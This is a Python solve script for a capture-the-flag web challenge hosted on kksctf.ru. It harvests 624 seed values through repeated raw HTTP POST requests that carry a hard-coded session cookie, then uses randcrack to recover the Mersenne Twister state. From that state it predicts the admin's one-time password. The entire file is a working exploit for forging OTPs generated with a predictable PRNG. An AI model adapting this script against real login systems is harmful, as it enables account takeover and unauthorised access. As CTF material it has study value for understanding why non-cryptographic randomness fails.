import random
from pwn import *
from randcrack import RandCrack
import zlib

rc = RandCrack()

p = 'POST /regen HTTP/1.1\r\n\
Host: tasks.open.kksctf.ru:20007\r\n\
Connection: keep-alive\r\n\
Content-Length: 17\r\n\
Cache-Control: max-age=0\r\n\
Origin: http://tasks.open.kksctf.ru:20007\r\n\
Upgrade-Insecure-Requests: 1\r\n\
Content-Type: application/x-www-form-urlencoded\r\n\
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36\r\n\
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\
Referer: http://tasks.open.kksctf.ru:20007/regen\r\n\
Accept-Encoding: gzip, deflate\r\n\
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,ja;q=0.5\r\n\
Cookie: PHPSESSID=481943c7014681051f83f0ab3df052f7; session=eyJ1aWQiOiJDamo5NWZ4c0tobktHT2ZHK3hqRFh3PT0ifQ.Xgg7Ow.bCqGLOuPAk6uADACGSZ8w6Ol-DE\r\n\
\r\n\
login=golem&otp=1\r\n'
bseed = zlib.crc32("golem".encode())
for i in range(624):
    r = remote("tasks.open.kksctf.ru", 20007)
    r.send(p)
    r.recvuntil(b'your new seed ')
    q = int(r.recvuntil(b' '))-bseed
    print(i, q)
    rc.submit(q)
    r.recvuntil(b'</html>')
    r.close()

r = remote("tasks.open.kksctf.ru", 20007)
r.send(p)
r.recvuntil(b'your new seed ')
q = int(r.recvuntil(b' '))
print(q)
print(rc.predict_randrange(0, 4294967294)+bseed)

bseed = zlib.crc32("admin".encode())
s = rc.predict_randrange(0, 4294967294)+bseed
random.seed(s)
first_opt = random.randint(0, 4294967294) * 1337
print(random.randint(0, 4294967294) * 1337)
